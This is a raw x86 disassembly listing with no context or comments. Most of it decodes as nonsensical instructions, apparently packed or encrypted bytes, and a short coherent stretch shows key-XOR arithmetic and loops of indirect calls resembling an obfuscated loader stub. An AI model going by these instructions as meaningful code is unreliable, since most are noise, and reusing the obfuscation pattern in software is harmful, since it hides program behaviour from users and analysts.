  40aa24:	div    BYTE PTR [edi]
  40aa26:	stos   DWORD PTR es:[edi],eax
  40aa27:	shr    ah,1
  40aa29:	mov    ebx,0xbeb3ddf0
  40aa2e:	hlt    
  40aa2f:	xchg   edx,eax
  40aa30:	sub    eax,DWORD PTR [ebp-0x32]
  40aa33:	(bad)  
  40aa34:	js     0x40aa5f
  40aa36:	mov    ds:0xd9a3a580,al
  40aa3c:	fisttp DWORD PTR [ebx]
  40aa3e:	inc    ebp
  40aa3f:	push   cs
  40aa40:	popf   
  40aa41:	pusha  
  40aa42:	lahf   
  40aa43:	cmp    cl,al
  40aa45:	(bad)  
  40aa46:	mov    DWORD PTR [esi],esi
  40aa48:	adc    BYTE PTR [ecx],0x9c
  40aa4b:	popf   
  40aa4c:	popf   
  40aa4d:	push   esp
  40aa4e:	popa   
  40aa4f:	dec    esi
  40aa50:	call   0x7027:0x7b7f1061
  40aa57:	pop    es
  40aa58:	cli    
  40aa59:	rol    DWORD PTR [esi+0x2d],1
  40aa5c:	scas   al,BYTE PTR es:[edi]
  40aa5d:	inc    esp
  40aa5e:	mov    bh,0x18
  40aa60:	pop    ebx
  40aa61:	aaa    
  40aa62:	cmp    eax,0xfe892756
  40aa67:	xchg   ebx,eax
  40aa68:	aam    0x79
  40aa6a:	push   cs
  40aa6b:	or     eax,0x6972866e
  40aa70:	pop    ecx
  40aa71:	cld    
  40aa72:	jae    0x40aa88
  40aa74:	and    eax,ecx
  40aa76:	out    dx,al
  40aa77:	lods   eax,DWORD PTR ds:[esi]
  40aa78:	inc    eax
  40aa79:	retf   0xd3b2
  40aa7c:	imul   ebp,esp,0xe8340cfb
  40aa82:	adc    al,0x78
  40aa84:	xchg   esp,eax
  40aa85:	test   DWORD PTR [ebx+eax*8+0x753529df],eax
  40aa8c:	movq   mm5,QWORD PTR [eax+0x36]
  40aa90:	out    0xbf,al
  40aa92:	jae    0x40aa4f
  40aa94:	cmp    DWORD PTR [eax-0x44],ecx
  40aa97:	jbe    0x40aa7f
  40aa99:	cs dec edx
  40aa9b:	scas   eax,DWORD PTR es:[edi]
  40aa9c:	daa    
  40aa9d:	test   BYTE PTR [edx],ch
  40aa9f:	push   ss
  40aaa0:	pop    edi
  40aaa1:	xor    DWORD PTR [esi-0x4],0x45
  40aaa5:	cmp    al,BYTE PTR [edx+0x765e8edf]
  40aaab:	fnclex 
  40aaad:	push   ss
  40aaae:	dec    ebx
  40aaaf:	in     eax,0x1f
  40aab1:	sub    ebx,DWORD PTR [eax+eax*8+0xb]
  40aab5:	add    al,0x99
  40aab7:	scas   al,BYTE PTR es:[edi]
  40aab8:	cmp    eax,0x114f09b
  40aabd:	cs cmp dl,bh
  40aac0:	xchg   bh,bl
  40aac2:	je     0x40aade
  40aac4:	pop    eax
  40aac5:	pause  
  40aac7:	shr    DWORD PTR [esi-0x350c744f],cl
  40aacd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aace:	sub    bh,BYTE PTR [edx]
  40aad0:	inc    ebx
  40aad1:	ja     0x40aa9d
  40aad3:	xchg   DWORD PTR [esp+eiz*4+0x7d],eax
  40aad7:	add    BYTE PTR [eax-0x73d51bcc],0x3c
  40aade:	jne    0x40ab33
  40aae0:	sbb    al,0x29
  40aae2:	mov    ebx,0x36ee2f11
  40aae8:	jl     0x40ab33
  40aaea:	sub    esp,esp
  40aaec:	js     0x40aa82
  40aaee:	inc    edi
  40aaef:	pop    ds
  40aaf0:	cmp    BYTE PTR [eax],ah
  40aaf2:	(bad)  
  40aaf3:	jp     0x40ab4c
  40aaf5:	lods   eax,DWORD PTR ds:[esi]
  40aaf6:	imul   eax,ebx,0xffffffea
  40aaf9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aafa:	mov    edi,0x574098de
  40aaff:	push   0xab0c5f16
  40ab04:	cmp    eax,0x427a1ed0
  40ab09:	or     al,0x3b
  40ab0b:	pop    ebp
  40ab0c:	aas    
  40ab0d:	scas   eax,DWORD PTR es:[edi]
  40ab0e:	les    esi,FWORD PTR [eax]
  40ab10:	add    eax,0x8f5dc639
  40ab15:	pop    edx
  40ab16:	ret    
  40ab17:	adc    al,0xf9
  40ab19:	dec    BYTE PTR [ecx]
  40ab1b:	aas    
  40ab1c:	test   BYTE PTR [edx+esi*2],0x87
  40ab20:	jle    0x40ab2e
  40ab22:	rcl    DWORD PTR [eax],1
  40ab24:	cmc    
  40ab25:	(bad)  
  40ab26:	popf   
  40ab27:	mov    edi,edx
  40ab29:	test   DWORD PTR [ecx],ebp
  40ab2b:	adc    eax,DWORD PTR [edx+0x2]
  40ab2e:	add    BYTE PTR [ecx+0x61],al
  40ab31:	dec    edx
  40ab32:	cmp    al,0xdb
  40ab34:	push   cs
  40ab35:	and    bl,BYTE PTR [esi]
  40ab37:	int3   
  40ab38:	push   edx
  40ab39:	pushaw 
  40ab3b:	ds repz mov bl,0xe9
  40ab3f:	imul   eax,DWORD PTR [ecx-0x6d],0xbbbe4759
  40ab46:	and    BYTE PTR [ebx+eax*4],0x91
  40ab4a:	sbb    DWORD PTR [ebx+0x3f097d8],edi
  40ab50:	sub    DWORD PTR [ebx],0x49c751a7
  40ab56:	nop
  40ab57:	mov    ds:0xe8eb2b39,al
  40ab5c:	in     al,dx
  40ab5d:	mov    ebx,0xe0621e15
  40ab62:	lock and bl,BYTE PTR [edi-0x740947ed]
  40ab69:	scas   eax,DWORD PTR es:[edi]
  40ab6a:	gs aad 0x36
  40ab6d:	dec    ecx
  40ab6e:	xchg   edi,eax
  40ab6f:	aaa    
  40ab70:	add    al,0xf2
  40ab72:	in     al,dx
  40ab73:	rcl    BYTE PTR [edx+0x428768ef],cl
  40ab79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab7a:	cmp    cl,BYTE PTR [ecx+0x45]
  40ab7d:	dec    esi
  40ab7e:	pop    ds
  40ab7f:	pop    eax
  40ab80:	retf   0x1423
  40ab83:	adc    al,0xa7
  40ab85:	bswap  esp
  40ab87:	inc    edi
  40ab88:	loopne 0x40abc9
  40ab8a:	ins    DWORD PTR es:[edi],dx
  40ab8b:	mov    bh,0xfe
  40ab8d:	push   ebx
  40ab8e:	dec    ebx
  40ab8f:	iret   
  40ab90:	daa    
  40ab91:	shl    BYTE PTR [esi+ebp*2],1
  40ab94:	iret   
  40ab95:	xor    esi,DWORD PTR [ecx-0x43]
  40ab98:	xor    DWORD PTR [esi+ebx*8-0x3f996026],ecx
  40ab9f:	sar    BYTE PTR [eax+0x47d9a6a8],cl
  40aba5:	loope  0x40ab74
  40aba7:	jnp    0x40abe6
  40aba9:	push   0xc275ffc0
  40abae:	and    DWORD PTR [edx],ebx
  40abb0:	cmp    esp,DWORD PTR [ebp-0x11]
  40abb3:	mov    dl,0x59
  40abb5:	and    al,0x40
  40abb7:	ds xchg edx,eax
  40abb9:	imul   esi,DWORD PTR [ecx-0x70],0xf1cb9066
  40abc0:	xor    esi,DWORD PTR [ebp+0x12f6a6a5]
  40abc6:	dec    edi
  40abc7:	sub    eax,0x7345fd79
  40abcc:	out    0x59,al
  40abce:	inc    eax
  40abcf:	adc    eax,0x65eb048b
  40abd4:	push   0x4d3dab5f
  40abd9:	clc    
  40abda:	or     BYTE PTR [edi],al
  40abdc:	sub    BYTE PTR [edx],bh
  40abde:	xchg   edx,eax
  40abdf:	jl     0x40ab90
  40abe1:	pop    esp
  40abe2:	jp     0x40aba8
  40abe4:	ret    0xafce
  40abe7:	jno    0x40abf6
  40abe9:	push   0x4
  40abeb:	imul   edx,DWORD PTR [edi+esi*2-0x5675759],0x61da8cf5
  40abf6:	daa    
  40abf7:	xchg   esp,eax
  40abf8:	push   0x88d0d65c
  40abfd:	push   eax
  40abfe:	adc    eax,0x81d033c1
  40ac03:	xor    eax,0x42fcf5
  40ac08:	movntq QWORD PTR [edx+0x0],mm0
  40ac0c:	add    edx,ecx
  40ac0e:	mov    DWORD PTR ds:0x42e703,0x189b
  40ac18:	cmp    edi,edx
  40ac1a:	mov    DWORD PTR ds:0x42fcdd,0x36a4
  40ac24:	jb     0x40d88a
  40ac2a:	mov    edx,DWORD PTR [ebp-0x28]
  40ac2d:	sbb    DWORD PTR ds:0x42fd7e,ebx
  40ac33:	mov    edi,DWORD PTR [ebp-0x4]
  40ac36:	xor    edx,eax
  40ac38:	sub    DWORD PTR ds:0x42fcf5,edx
  40ac3e:	xor    edi,eax
  40ac40:	mov    DWORD PTR ds:0x42e6f7,0x1f
  40ac4a:	cmp    DWORD PTR ds:0x42e6f7,0x0
  40ac51:	je     0x40acfa
  40ac57:	cmp    DWORD PTR ds:0x42e6f7,0x2e
  40ac5e:	jne    0x40ac7d
  40ac64:	push   DWORD PTR [ebp-0xc]
  40ac67:	push   0x42e23d
  40ac6c:	push   DWORD PTR [ebp-0x24]
  40ac6f:	push   0x691a
  40ac74:	push   DWORD PTR [ebp-0x10]
  40ac77:	call   DWORD PTR ds:0x42e2f3
  40ac7d:	mov    ebx,DWORD PTR ds:0x42e6f7
  40ac83:	dec    ebx
  40ac84:	mov    DWORD PTR ds:0x42e6f7,ebx
  40ac8a:	jmp    0x40ac4a
  40ac8f:	and    DWORD PTR ds:0x42e128,0x0
  40ac99:	jmp    0x40acad
  40ac9e:	xor    ebx,ebx
  40aca0:	or     ebx,DWORD PTR ds:0x42e128
  40aca6:	inc    ebx
  40aca7:	mov    DWORD PTR ds:0x42e128,ebx
  40acad:	cmp    DWORD PTR ds:0x42e128,0x1a
  40acb4:	jae    0x40acfa
  40acba:	cmp    DWORD PTR ds:0x42e128,0xc
  40acc1:	jne    0x40acd5
  40acc7:	push   0x2dd0
  40accc:	push   DWORD PTR [ebp-0x14]
  40accf:	call   DWORD PTR ds:0x42e2f7
  40acd5:	cmp    DWORD PTR ds:0x42e128,0xb
  40acdc:	jne    0x40acef
  40ace2:	mov    ebx,DWORD PTR ds:0x42e128
  40ace8:	inc    ebx
  40ace9:	mov    DWORD PTR ds:0x42e128,ebx
  40acef:	jmp    0x40ac9e
  40acf4:	adc    ebx,0x2885
  40acfa:	add    edi,ecx
  40acfc:	sbb    ebx,0x5c75
  40ad02:	add    edx,ecx
  40ad04:	imul   edx,edi
  40ad07:	sub    ebx,DWORD PTR ds:0x42e134
  40ad0d:	mov    edi,DWORD PTR [ebp-0x8]
  40ad10:	mov    DWORD PTR ds:0x42fce1,0x13
  40ad1a:	cmp    DWORD PTR ds:0x42fce1,0x0
  40ad21:	je     0x40ad54
  40ad27:	cmp    DWORD PTR ds:0x42fce1,0x14
  40ad2e:	jne    0x40ad42
  40ad34:	push   DWORD PTR [ebp-0x28]
  40ad37:	push   0x42fd01
  40ad3c:	call   DWORD PTR ds:0x42e54b
  40ad42:	mov    ebx,DWORD PTR ds:0x42fce1
  40ad48:	dec    ebx
  40ad49:	mov    DWORD PTR ds:0x42fce1,ebx
  40ad4f:	jmp    0x40ad1a
  40ad54:	mov    ebx,DWORD PTR [ebp-0x10]
  40ad57:	sub    ebx,edi
  40ad59:	cmp    ebx,edx
  40ad5b:	ja     0x40ad6d
  40ad61:	mov    edx,DWORD PTR [ebp-0x4]
  40ad64:	xor    edx,eax
  40ad66:	add    edx,ecx
  40ad68:	jmp    0x40c0fc
  40ad6d:	mov    edx,DWORD PTR [ebp-0x2c]
  40ad70:	mov    edi,DWORD PTR [ebp-0x4]
  40ad73:	xor    edx,eax
  40ad75:	xor    edi,eax
  40ad77:	add    edi,ecx
  40ad79:	add    edx,ecx
  40ad7b:	imul   edx,edi
  40ad7e:	mov    edi,DWORD PTR [ebp-0x8]
  40ad81:	mov    ebx,DWORD PTR [ebp-0x10]
  40ad84:	sub    ebx,edi
  40ad86:	cmp    ebx,edx
  40ad88:	ja     0x40ad96
  40ad8e:	mov    edx,DWORD PTR [ebp-0x28]
  40ad91:	jmp    0x40c0ee
  40ad96:	mov    edx,DWORD PTR [ebp-0x30]
  40ad99:	mov    edi,DWORD PTR [ebp-0x4]
  40ad9c:	xor    edx,eax
  40ad9e:	xor    edi,eax
  40ada0:	add    edi,ecx
  40ada2:	jmp    0x40b160
  40ada7:	xor    BYTE PTR [eax+eiz*4],bl
  40adaa:	mov    bh,0x6c
  40adac:	mov    bl,0xc7
  40adae:	jae    0x40ae09
  40adb0:	jg     0x40ad82
  40adb2:	ja     0x40ad8b
  40adb4:	inc    edi
  40adb5:	inc    esi
  40adb6:	pop    esp
  40adb7:	add    edi,ebp
  40adb9:	jo     0x40ae2b
  40adbb:	lahf   
  40adbc:	jge    0x40ae2e
  40adbe:	jo     0x40adc3
  40adc0:	aaa    
  40adc1:	pusha  
  40adc2:	int    0x88
  40adc4:	push   esp
  40adc5:	pmovmskb eax,mm6
  40adc8:	add    eax,0x30a3bac4
  40adcd:	sbb    eax,DWORD PTR [esi]
  40adcf:	fnstcw WORD PTR [edx+0x3c]
  40add2:	in     al,dx
  40add3:	sub    BYTE PTR [eax+0x4698dc03],dl
  40add9:	cdq    
  40adda:	imul   ebp,esi,0x42
  40addd:	xchg   ecx,eax
  40adde:	adc    bh,BYTE PTR [ebx]
  40ade0:	xlat   BYTE PTR ds:[ebx]
  40ade1:	inc    esp
  40ade2:	mov    eax,ds:0xb085bb93
  40ade7:	pop    edi
  40ade8:	jmp    0x40ad83
  40adea:	or     ch,BYTE PTR [ebp+0x1e]
  40aded:	ficomp WORD PTR [ebx+0x5ca19233]
  40adf3:	or     esp,esi
  40adf5:	or     al,bh
  40adf7:	adc    cl,BYTE PTR [esi]
  40adf9:	ror    dh,1
  40adfb:	dec    ebx
  40adfc:	pop    ds
  40adfd:	jmp    0xe736c40d
  40ae02:	mov    al,ds:0x6642df58
  40ae07:	cmp    DWORD PTR [ecx+0x6e],edi
  40ae0a:	jle    0x40ae41
  40ae0c:	out    0x83,eax
  40ae0e:	idiv   BYTE PTR [ebx+edi*2+0x5c]
  40ae12:	mov    edx,0x4f04c555
  40ae17:	dec    ecx
  40ae18:	clc    
  40ae19:	loope  0x40adc5
  40ae1b:	mov    dl,0xfb
  40ae1d:	js     0x40ae82
  40ae1f:	das    
  40ae20:	fsubr  DWORD PTR [eax+0x75]
  40ae23:	push   ebp
  40ae24:	adc    DWORD PTR ds:0x242ca2fb,ecx
  40ae2a:	mov    edx,0x5b8b366
  40ae2f:	les    edi,FWORD PTR [edx-0x3d1340aa]
  40ae35:	clc    
  40ae36:	in     eax,0x4e
  40ae38:	les    eax,FWORD PTR [eax+0x41]
  40ae3b:	ret    0xfd3c
  40ae3e:	pushf  
  40ae3f:	popf   
  40ae40:	xchg   esp,eax
  40ae41:	xchg   edi,eax
  40ae42:	push   ebp
  40ae43:	dec    ebx
  40ae44:	mov    ch,0xbf
  40ae46:	adc    BYTE PTR [ebx-0x33bdc5ba],cl
  40ae4c:	cmc    
  40ae4d:	cwde   
  40ae4e:	and    eax,0x901c4178
  40ae53:	inc    esi
  40ae54:	int3   
  40ae55:	inc    edi
  40ae56:	jmp    0xbe61:0x12e7f42c
  40ae5d:	adc    eax,0x710e3712
  40ae62:	dec    esp
  40ae63:	int    0x8a
  40ae65:	and    cl,ch
  40ae67:	push   ebx
  40ae68:	idiv   BYTE PTR [edx+eiz*8]
  40ae6b:	mov    cl,BYTE PTR [esi]
  40ae6d:	jmp    0x40adfb
  40ae6f:	xlat   BYTE PTR ds:[ebx]
  40ae70:	jp     0x40aeb4
  40ae72:	or     DWORD PTR [eax],ebp
  40ae74:	xchg   esp,eax
  40ae75:	(bad)  
  40ae76:	sub    edx,0x8d55c7cc
  40ae7c:	ror    eax,0xed
  40ae7f:	shr    DWORD PTR [esi-0x768497be],0xff
  40ae86:	mov    edi,0x181be222
  40ae8b:	sbb    bl,BYTE PTR [eax]
  40ae8d:	in     al,0xc0
  40ae8f:	outs   dx,BYTE PTR ds:[esi]
  40ae90:	in     al,0x34
  40ae92:	pop    ecx
  40ae93:	sahf   
  40ae94:	jmp    0x40ae86
  40ae96:	pop    ebp
  40ae97:	sbb    dh,BYTE PTR [edx+0x7c]
  40ae9a:	cmp    al,0x16
  40ae9c:	pop    ebp
  40ae9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae9e:	mov    eax,0xc0507f6b
  40aea3:	fstp   QWORD PTR [edi]
  40aea5:	mov    bl,0xbd
  40aea7:	mov    ebx,DWORD PTR [edx]
  40aea9:	push   eax
  40aeaa:	outs   dx,BYTE PTR ds:[esi]
  40aeab:	xor    BYTE PTR [esi+eax*1-0x71b10e3b],0xf5
  40aeb3:	mov    ebp,0xcdf79b1c
  40aeb8:	out    dx,eax
  40aeb9:	mov    DWORD PTR [edi-0x425c2b66],eax
  40aebf:	add    bl,cl
  40aec1:	push   DWORD PTR [eax]
  40aec3:	xchg   bh,ch
  40aec5:	into   
  40aec6:	les    ecx,FWORD PTR [edi]
  40aec8:	popa   
  40aec9:	ins    DWORD PTR es:[edi],dx
  40aeca:	sbb    al,0x2d
  40aecc:	inc    ecx
  40aecd:	sub    edx,DWORD PTR [ecx-0x1e]
  40aed0:	add    bh,cl
  40aed2:	cmp    esp,esi
  40aed4:	cs mov ebx,0xe9218dd
  40aeda:	and    DWORD PTR ds:[eax],0xab08f3d6
  40aee1:	sbb    DWORD PTR [ebx+0x4a26974e],edi
  40aee7:	xchg   ebp,eax
  40aee8:	loop   0x40aee8
  40aeea:	sbb    edi,DWORD PTR [eax+0x2f1e5331]
  40aef0:	std    
  40aef1:	scas   eax,DWORD PTR es:[edi]
  40aef2:	ins    BYTE PTR es:[edi],dx
  40aef3:	jnp    0x40aebe
  40aef5:	pop    es
  40aef6:	jecxz  0x40ae80
  40aef8:	dec    DWORD PTR [esi+0x21]
  40aefb:	cmp    eax,0x528be10f
  40af00:	stos   DWORD PTR es:[edi],eax
  40af01:	push   cs
  40af02:	and    ah,BYTE PTR [ebx]
  40af04:	in     eax,dx
  40af05:	push   ecx
  40af06:	(bad)  
  40af07:	ret    0x6668
  40af0a:	sbb    DWORD PTR fs:[ecx],ecx
  40af0d:	iret   
  40af0e:	imul   BYTE PTR [ecx+0x54]
  40af11:	push   ebp
  40af12:	jge    0x40aea1
  40af14:	add    eax,0x55fa52c2
  40af19:	(bad)  
  40af1a:	sti    
  40af1b:	xchg   BYTE PTR [ebp+0x6a83c95],dh
  40af21:	repz cmp al,0x6e
  40af24:	popf   
  40af25:	call   0x110361b9
  40af2a:	xchg   bl,cl
  40af2c:	int    0x48
  40af2e:	sti    
  40af2f:	mov    esi,0x34ff8883
  40af34:	mov    dh,0x1b
  40af36:	mov    bl,0x9e
  40af38:	mov    cl,0xe6
  40af3a:	or     BYTE PTR [edx+0x6a7e4585],bl
  40af40:	outs   dx,BYTE PTR ds:[esi]
  40af41:	lods   eax,DWORD PTR ds:[esi]
  40af42:	mov    ebp,DWORD PTR [ebx-0x7a]
  40af45:	shl    BYTE PTR ds:0x6ba16b65,1
  40af4b:	xor    DWORD PTR [eax-0x2],0xfffffff1
  40af4f:	aam    0x71
  40af51:	ja     0x40af2c
  40af53:	mov    esi,0x969f8d92
  40af58:	lods   eax,DWORD PTR ds:[esi]
  40af59:	xchg   DWORD PTR [edi-0x80],eax
  40af5c:	or     DWORD PTR [ecx-0x4d],esp
  40af5f:	xor    eax,0x5b42bff1
  40af64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af65:	sub    BYTE PTR [edx+edx*2+0x30af1927],0xdb
  40af6d:	rol    DWORD PTR fs:[ecx+ebx*8-0x33ba4d79],1
  40af75:	rol    DWORD PTR [esi-0x40],1
  40af78:	mov    ebp,edi
  40af7a:	inc    edx
  40af7b:	je     0x40af49
  40af7d:	mov    cl,0x69
  40af7f:	fs int 0x4
  40af82:	jg     0x40afd1
  40af84:	shr    BYTE PTR [eax-0x7d],0x7d
  40af88:	jp     0x40af20
  40af8a:	mov    ds:0xda599112,al
  40af8f:	push   esp
  40af90:	and    BYTE PTR [edi+0x2c],al
  40af93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af94:	sbb    al,0xee
  40af96:	pop    ds
  40af97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af98:	into   
  40af99:	mov    ecx,ebp
  40af9b:	add    eax,0xb8d4b2d0
  40afa0:	mov    ch,0xca
  40afa2:	adc    DWORD PTR [ebp-0x2a],edx
  40afa5:	or     edi,DWORD PTR [eax]
  40afa7:	(bad)  
  40afa8:	sti    
  40afa9:	aas    
  40afaa:	mov    WORD PTR [edi],gs
  40afac:	push   ebp
  40afad:	ret    0x1a5c
  40afb0:	cld    
  40afb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40afb2:	fimul  DWORD PTR [ecx-0x4c]
  40afb5:	out    0x1c,al
  40afb7:	adc    al,0xaf
  40afb9:	xlat   BYTE PTR ds:[ebx]
  40afba:	dec    edx
  40afbb:	push   0xffffffc6
  40afbd:	add    al,0x2c
  40afbf:	and    al,0x70
  40afc1:	(bad)  
  40afc2:	mov    ebp,0xcd2a96a5
  40afc7:	int3   
  40afc8:	cdq    
  40afc9:	mov    cl,0x1e
  40afcb:	pop    esi
  40afcc:	(bad)  
  40afcd:	jle    0x40b047
  40afcf:	(bad)  
  40afd0:	into   
  40afd1:	test   DWORD PTR [edi],esi
  40afd3:	adc    DWORD PTR [edi+0x4419ca84],ebp
  40afd9:	xchg   ecx,eax
  40afda:	jnp    0x40b014
  40afdc:	jb     0x40b033
  40afde:	cli    
  40afdf:	into   
  40afe0:	fxtract 
  40afe2:	sbb    eax,eax
  40afe4:	or     bl,dh
  40afe6:	sti    
  40afe7:	dec    ecx
  40afe8:	rcr    DWORD PTR [edi+0x31],1
  40afeb:	xor    esp,edi
  40afed:	test   dl,bh
  40afef:	add    BYTE PTR [eax+0x7e],dl
  40aff2:	or     BYTE PTR [eax+0x67],ch
  40aff5:	das    
  40aff6:	aas    
  40aff7:	sub    al,0x3d
  40aff9:	aas    
  40affa:	mov    cl,0x7
  40affc:	int    0xf8
  40affe:	int3   
  40afff:	popa   
  40b000:	mov    cs,WORD PTR [ecx]
  40b002:	jno    0x40b067
  40b004:	cld    
  40b005:	and    ecx,DWORD PTR [esp+edi*4-0x43]
  40b009:	add    al,0x2c
  40b00b:	pop    es
  40b00c:	xchg   esp,eax
  40b00d:	out    dx,eax
  40b00e:	sub    al,al
  40b010:	jbe    0x40b005
  40b012:	scas   al,BYTE PTR es:[edi]
  40b013:	(bad)  
  40b014:	pop    ebp
  40b015:	sahf   
  40b016:	inc    edx
  40b017:	retf   0xaa8d
  40b01a:	mov    edx,0x3e772692
  40b01f:	push   es
  40b020:	dec    ebx
  40b021:	test   ebp,edi
  40b023:	push   ds
  40b024:	cmp    al,0xb4
  40b026:	mov    dl,0xed
  40b028:	ror    ebp,1
  40b02a:	test   DWORD PTR [ebp+0x6],ebx
  40b02d:	add    eax,0xbcc910b6
  40b032:	(bad)  
  40b033:	cmp    DWORD PTR [esi],ebp
  40b035:	inc    ebx
  40b036:	aam    0xa9
  40b038:	push   edx
  40b039:	cmp    eax,0xf4ecd782
  40b03e:	mov    edi,esi
  40b040:	dec    edi
  40b041:	ins    BYTE PTR es:[edi],dx
  40b042:	fcmovb st,st(7)
  40b044:	sub    al,0x8a
  40b046:	mov    edi,DWORD PTR [ecx+0x21acfbd6]
  40b04c:	jge    0x40b063
  40b04e:	push   esp
  40b04f:	(bad)  
  40b050:	mov    BYTE PTR [eax],dh
  40b052:	mov    ah,0x2f
  40b054:	jp     0x40b066
  40b056:	push   ss
  40b057:	xchg   edi,eax
  40b058:	ficom  WORD PTR [ebp+0x339686fc]
  40b05e:	imul   ecx,DWORD PTR ds:0x1f75c7b4,0xffffffec
  40b065:	adc    DWORD PTR [edi],ebx
  40b067:	xchg   esp,eax
  40b068:	push   esi
  40b069:	sbb    DWORD PTR [ecx],esp
  40b06b:	aam    0xb9
  40b06d:	test   eax,0xea22a517
  40b072:	lock and al,0x13
  40b075:	sub    DWORD PTR [edi+0xeb69f75],eax
  40b07b:	or     al,0xfb
  40b07d:	cwde   
  40b07e:	lds    esi,FWORD PTR [eax+esi*1+0x65]
  40b082:	jo     0x40b103
  40b084:	in     eax,0xb
  40b086:	fisttp WORD PTR [ebp+0x6b]
  40b089:	imul   ebp,DWORD PTR [ecx],0xef4b788c
  40b08f:	jb     0x40b02d
  40b091:	ret    0xf040
  40b094:	std    
  40b095:	jmp    0x5c00cf15
  40b09a:	mov    ecx,0x8a350bfb
  40b09f:	cmp    BYTE PTR [ebx],dh
  40b0a1:	sti    
  40b0a2:	neg    ecx
  40b0a4:	repz dec eax
  40b0a6:	bound  esp,QWORD PTR [esi+0x7db8311b]
  40b0ac:	mov    bl,0xfd
  40b0ae:	xchg   esp,eax
  40b0af:	ret    0xc9ee
  40b0b2:	leave  
  40b0b3:	test   eax,0xe704165f
  40b0b9:	ror    BYTE PTR [esi-0x289c818a],cl
  40b0bf:	cmp    DWORD PTR [edi+eiz*1],edx
  40b0c2:	ins    BYTE PTR es:[edi],dx
  40b0c3:	add    BYTE PTR [ecx],bl
  40b0c5:	mov    esi,0x5c0fcc7d
  40b0ca:	pop    ecx
  40b0cb:	daa    
  40b0cc:	sbb    DWORD PTR [edx],0x40
  40b0cf:	adc    eax,esp
  40b0d1:	popf   
  40b0d2:	jge    0x40b09a
  40b0d4:	jle    0x40b147
  40b0d6:	sti    
  40b0d7:	xchg   ebp,eax
  40b0d8:	or     DWORD PTR [edx],esp
  40b0da:	mov    edi,0xaa642c9c
  40b0df:	xchg   ebx,eax
  40b0e0:	xlat   BYTE PTR ds:[ebx]
  40b0e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b0e2:	ror    BYTE PTR [ebx],0x2f
  40b0e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b0e6:	fidiv  WORD PTR [esi]
  40b0e8:	mov    ecx,0x410b4428
  40b0ed:	cli    
  40b0ee:	xchg   esp,eax
  40b0ef:	out    dx,al
  40b0f0:	jne    0x40b167
  40b0f2:	(bad)  
  40b0f3:	pop    ebx
  40b0f4:	jns    0x40b0f2
  40b0f6:	pop    eax
  40b0f7:	xchg   edx,eax
  40b0f8:	in     al,0x18
  40b0fa:	mov    edi,ebp
  40b0fc:	xchg   esi,eax
  40b0fd:	jl     0x40b156
  40b0ff:	js     0x40b0cc
  40b101:	nop
  40b102:	int3   
  40b103:	in     al,0xc9
  40b105:	mov    ch,BYTE PTR [ecx-0x4468aad4]
  40b10b:	ret    0x313a
  40b10e:	sbb    eax,0xc0e48d66
  40b113:	mov    bl,0xd2
  40b115:	sbb    DWORD PTR [ebx+ecx*1],esi
  40b118:	hlt    
  40b119:	add    al,0xcd
  40b11b:	in     al,0x26
  40b11d:	(bad)  
  40b11e:	adc    ch,dh
  40b120:	xchg   BYTE PTR [esi+0x6faba8bf],bl
  40b126:	data16 jno 0x40b113
  40b129:	or     BYTE PTR [eax-0xc94f55f],al
  40b12f:	inc    esp
  40b130:	ins    BYTE PTR es:[edi],dx
  40b131:	cmp    bl,BYTE PTR [ebx+0x67db881b]
  40b137:	xchg   ebx,eax
  40b138:	push   esi
  40b139:	xchg   ecx,eax
  40b13a:	pop    ds
  40b13b:	imul   esp,DWORD PTR [esi+0x5d],0xef11358
  40b142:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b143:	daa    
  40b144:	bound  edi,QWORD PTR [edx+eax*1+0x16]
  40b148:	mov    edx,0xd1498106
  40b14d:	ss fs out 0x73,eax
  40b151:	rdmsr  
  40b153:	mov    ch,0xcb
  40b155:	pushf  
  40b156:	outs   dx,DWORD PTR ds:[esi]
  40b157:	or     dl,bh
  40b159:	aam    0xdf
  40b15b:	xor    BYTE PTR [edi+0x3024247],ah
  40b161:	shr    ecx,1
  40b163:	mov    ecx,0xd2000003
  40b168:	jne    0x40b1a1
  40b16a:	sub    esi,DWORD PTR [ebx-0x188a2d97]
  40b170:	retf   0xa792
  40b173:	cwde   
  40b174:	dec    esp
  40b175:	sbb    eax,0x70faa211
  40b17a:	jo     0x40b11b
  40b17c:	jge    0x40b1ee
  40b17e:	jo     0x40b1d0
  40b180:	stos   DWORD PTR es:[edi],eax
  40b181:	lods   eax,DWORD PTR fs:[esi]
  40b183:	add    al,0xa3
  40b185:	mov    al,0xc0
  40b187:	xchg   DWORD PTR [eax-0x4355595c],ebp
  40b18d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b18e:	dec    di
  40b190:	mov    dl,bl
  40b192:	jmp    0x13d733bb
  40b197:	cwde   
  40b198:	call   0x9a0b:0x1ceb73a6
  40b19f:	fistp  QWORD PTR [edx+0x33]
  40b1a2:	mov    dl,0x63
  40b1a4:	pop    esi
  40b1a5:	push   esi
  40b1a6:	imul   esp,DWORD PTR [ecx+0x2a28e895],0x45
  40b1ad:	pop    ds
  40b1ae:	inc    esp
  40b1af:	mov    ds:0xee3c1420,eax
  40b1b4:	push   DWORD PTR [ebp+0x43]
  40b1b7:	stc    
  40b1b8:	push   esi
  40b1b9:	cld    
  40b1ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b1bb:	sbb    al,BYTE PTR [ebp+0x14]
  40b1be:	mov    ?,esi
  40b1c0:	and    ebp,ebx
  40b1c2:	inc    ebx
  40b1c3:	jns    0x40b1d6
  40b1c5:	fsubr  DWORD PTR [ebp+0x6d0932cc]
  40b1cb:	mov    ds:0x7a318957,eax
  40b1d0:	iret   
  40b1d1:	inc    esi
  40b1d2:	call   0x37ac51b0
  40b1d7:	popa   
  40b1d8:	mov    ebp,0x68783a5e
  40b1dd:	dec    ebx
  40b1de:	xchg   ebp,eax
  40b1df:	and    cl,BYTE PTR [edi]
